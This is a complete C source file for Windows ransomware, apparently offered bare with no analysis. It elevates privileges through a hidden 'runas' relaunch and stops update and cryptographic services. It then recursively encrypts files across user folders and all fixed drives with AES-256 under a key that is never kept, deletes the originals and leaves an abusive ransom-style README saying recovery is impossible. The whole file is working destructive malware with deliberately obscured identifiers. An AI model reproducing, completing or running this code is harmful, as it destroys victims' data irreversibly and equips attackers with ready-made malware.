#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <conio.h>
#include <time.h>
#include <psapi.h>
#include <tchar.h>
#include <bcrypt.h>
#include <threadpoolapiset.h>

#define BUF_SIZE 4096

#define X(s) (s[0]^s[1])
#define XSTR(s) X(s), s[1]

#define _str(s) #s
#define obf_str(s) _str(XSTR(s))

typedef struct {
    char *p1;
    unsigned char p2[32];
    unsigned char p3[16];
} CustomStruct;

void func1(const char *p4, const unsigned char *p2, const unsigned char *p3);
void func2(const char *p5, const unsigned char *p2, const unsigned char *p3, int p6);
int func3();
void func4();
void func5(unsigned char *p7, size_t p8);
void func6(unsigned char *p2, unsigned char *p3);
void func7(unsigned char *p2, unsigned char *p3);

TP_CALLBACK_ENVIRON tpoolEnv;
PTP_POOL tpool;
PTP_CLEANUP_GROUP tpoolCleanupGroup;

void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
    CustomStruct *p9 = (CustomStruct *)context;
    func1(p9->p1, p9->p2, p9->p3);
    free(p9->p1);
    free(p9);
}

void initThreadPool() {
    tpool = CreateThreadpool(NULL);
    if (!tpool) {
        printf("tpcf: %d\n", GetLastError());
        exit(1);
    }

    tpoolCleanupGroup = CreateThreadpoolCleanupGroup();
    if (!tpoolCleanupGroup) {
        printf("pf: %d\n", GetLastError());
        CloseThreadpool(tpool);
        exit(1);
    }

    InitializeThreadpoolEnvironment(&tpoolEnv);
    SetThreadpoolCallbackPool(&tpoolEnv, tpool);
    SetThreadpoolCallbackCleanupGroup(&tpoolEnv, tpoolCleanupGroup, NULL);
}

void cleanupThreadPool() {
    CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
    CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
    CloseThreadpool(tpool);
}

int checkAdmin() {
    BOOL isAdmin = FALSE;
    PSID pSID;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
        CheckTokenMembership(NULL, pSID, &isAdmin);
        FreeSid(pSID);
    }
    return isAdmin;
}

void elevatePrivileges() {
    if (!checkAdmin()) {
        TCHAR szPath[MAX_PATH];
        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = { sizeof(sei) };
            sei.lpVerb = _T("runas");
            sei.lpFile = szPath;
            sei.lpParameters = _T("--food");
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;

            if (!ShellExecuteEx(&sei)) {
                exit(1);
            }
            exit(0);
        }
    }
}

void stopServices() {
    SC_HANDLE scMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scMgr) {
        const char *services[] = { "wuauserv", "bits", "cryptsvc" };
        for (int i = 0; i < sizeof(services) / sizeof(services[0]); i++) {
            SC_HANDLE svc = OpenService(scMgr, services[i], SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (svc) {
                SERVICE_STATUS svcStatus;
                if (ControlService(svc, SERVICE_CONTROL_STOP, &svcStatus)) {
                    printf("s %s st.\n", services[i]);
                }
                CloseServiceHandle(svc);
            }
        }
        CloseServiceHandle(scMgr);
    }
}

void func1(const char *p4, const unsigned char *p2, const unsigned char *p3) {
    char modPath[MAX_PATH];
    GetModuleFileName(NULL, modPath, MAX_PATH);
    if (strstr(p4, obf_str(".exe")) || _stricmp(p4, modPath) == 0) {
        return;
    }

    FILE *inFile = fopen(p4, "rb");
    if (!inFile) return;

    char outFilePath[256];
    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", p4);

    FILE *outFile = fopen(outFilePath, "wb");
    if (!outFile) {
        fclose(inFile);
        return;
    }

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptHashData(hHash, p2, 32, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    CryptDestroyHash(hHash);

    if (!CryptSetKeyParam(hKey, KP_IV, p3, 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        fclose(inFile);
        fclose(outFile);
        return;
    }

    unsigned char buf[BUF_SIZE];
    unsigned char encBuf[BUF_SIZE + 16];
    DWORD bytesRead, bytesWritten;

    while ((bytesRead = fread(buf, 1, BUF_SIZE, inFile)) > 0) {
        bytesWritten = bytesRead;
        if (!CryptEncrypt(hKey, 0, feof(inFile), 0, encBuf, &bytesWritten, sizeof(encBuf))) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            fclose(inFile);
            fclose(outFile);
            return;
        }
        fwrite(encBuf, 1, bytesWritten, outFile);
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    fclose(inFile);
    fclose(outFile);

    remove(p4);
}

int readmeExists(const char *p5) {
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);
    struct stat buffer;
    return (stat(rPath, &buffer) == 0);
}

void createReadme(const char *p5) {
    if (readmeExists(p5)) {
        return;
    }
    char rPath[256];
    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);

    FILE *readme = fopen(rPath, "w");
    if (readme) {
        fprintf(readme, "Hello.\n Well, you got fucked. more specifically your files are.\nThere's no way to recover the files cuz im not gonna be a retard and demand shit.\n");
        fclose(readme);
    }
}

int checkSystemDir(const char *p5) {
    const char *sysDirs[] = {
        "C:\\Windows",
        "C:\\Users\\Default",
        "C:\\Users\\Public",
        NULL
    };

    for (int i = 0; sysDirs[i] != NULL; i++) {
        if (_stricmp(p5, sysDirs[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

int checkMemory() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    if (memStatus.dwMemoryLoad > 80) {
        return 0;
    }

    FILETIME idleTime, kernelTime, userTime;
    if (GetSystemTimes(&idleTime, &kernelTime, &userTime)) {
        static ULARGE_INTEGER prevIdleTime = { 0 };
        static ULARGE_INTEGER prevKernelTime = { 0 };
        static ULARGE_INTEGER prevUserTime = { 0 };

        ULARGE_INTEGER currIdleTime, currKernelTime, currUserTime;

        currIdleTime.LowPart = idleTime.dwLowDateTime;
        currIdleTime.HighPart = idleTime.dwHighDateTime;
        currKernelTime.LowPart = kernelTime.dwLowDateTime;
        currKernelTime.HighPart = kernelTime.dwHighDateTime;
        currUserTime.LowPart = userTime.dwLowDateTime;
        currUserTime.HighPart = userTime.dwHighDateTime;

        ULONGLONG idleDiff = currIdleTime.QuadPart - prevIdleTime.QuadPart;
        ULONGLONG kernelDiff = currKernelTime.QuadPart - prevKernelTime.QuadPart;
        ULONGLONG userDiff = currUserTime.QuadPart - prevUserTime.QuadPart;

        ULONGLONG totalDiff = kernelDiff + userDiff;
        double cpuUsage = (totalDiff - idleDiff) * 100.0 / totalDiff;

        prevIdleTime = currIdleTime;
        prevKernelTime = currKernelTime;
        prevUserTime = currUserTime;

        return cpuUsage < 80;
    }

    return 1;
}

void func2(const char *p5, const unsigned char *p2, const unsigned char *p3, int p6) {
    WIN32_FIND_DATA findData;
    HANDLE hFind;
    char searchPath[512];
    char fullPath[512];

    if (checkSystemDir(p5)) {
        return;
    }

    snprintf(searchPath, sizeof(searchPath), "%s\\*", p5);
    hFind = FindFirstFile(searchPath, &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            snprintf(fullPath, sizeof(fullPath), "%s\\%s", p5, findData.cFileName);

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                if (p6 < 3) {
                    func2(fullPath, p2, p3, p6 + 1);
                }
            } else {
                const char *fileExtension = strrchr(findData.cFileName, '.');
                if (!readmeExists(p5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
                    createReadme(p5);
                }

                CustomStruct *p9 = (CustomStruct *)malloc(sizeof(CustomStruct));
                p9->p1 = _strdup(fullPath);
                memcpy(p9->p2, p2, 32);
                memcpy(p9->p3, p3, 16);

                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, p9, &tpoolEnv);
                if (work) {
                    SubmitThreadpoolWork(work);
                } else {
                    free(p9->p1);
                    free(p9);
                }
            }
        }
    } while (FindNextFile(hFind, &findData) != 0);

    FindClose(hFind);
}

void processFiles(const unsigned char *p2, const unsigned char *p3, int p6) {
    KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
    PWSTR folderPath;

    for (int i = 0; !IsEqualGUID(&folders[i], &GUID_NULL); i++) {
        if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
            char dirPath[MAX_PATH];
            wcstombs(dirPath, folderPath, MAX_PATH);
            func2(dirPath, p2, p3, p6);
            CoTaskMemFree(folderPath);
        }
    }

    for (char drive = 'A'; drive <= 'Z'; drive++) {
        char rootPath[4] = { drive, ':', '\\', '\0' };
        if (GetDriveType(rootPath) == DRIVE_FIXED) {
            func2(rootPath, p2, p3, p6);
        }
    }
}

void xorEncrypt(unsigned char *p7, size_t p8) {
    for (size_t i = 0; i < p8; i++) {
        p7[i] ^= 0xAA;
    }
}

void generateKeys(unsigned char *p2, unsigned char *p3) {
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 32, p2);
        CryptGenRandom(hProv, 16, p3);
        CryptReleaseContext(hProv, 0);

        xorEncrypt(p2, 32);
        xorEncrypt(p3, 16);
    } else {
        exit(1);
    }
}

void decryptKeys(unsigned char *p2, unsigned char *p3) {
    xorEncrypt(p2, 32);
    xorEncrypt(p3, 16);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        elevatePrivileges();
        ShellExecute(NULL, "open", argv[0], "--food", NULL, SW_HIDE);
        return 0;
    }

    unsigned char p2[32];
    unsigned char p3[16];

    generateKeys(p2, p3);

    stopServices();

    decryptKeys(p2, p3);

    initThreadPool();

    if (strcmp(argv[1], "--food") == 0) {
        processFiles(p2, p3, 0);
    } else {
        return 1;
    }

    cleanupThreadPool();

    return 0;
}
